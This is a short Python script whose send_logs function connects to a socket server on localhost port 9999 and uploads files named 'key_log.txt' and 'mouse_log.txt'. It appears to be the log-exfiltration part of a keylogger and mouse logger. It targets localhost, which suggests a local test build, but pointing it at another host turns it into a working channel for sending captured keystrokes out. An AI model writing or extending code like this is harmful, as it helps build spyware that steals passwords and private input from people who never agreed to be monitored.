import socket
import sys
files = ['key_log.txt', 'mouse_log.txt']
def send_logs():
    s=None
    try:
        s = socket.socket()
        s.connect(("localhost",9999))
        for filename in files:              
                try:
                    with open(filename, "rb") as f:
                        s.sendall(f.read())
                except FileNotFoundError:
                    print(f"Skipping missing log file: {filename}")
    except OSError as e:
        print(f"Could not reach server: {e}")
        return
    finally:
        if s:
            s.close()
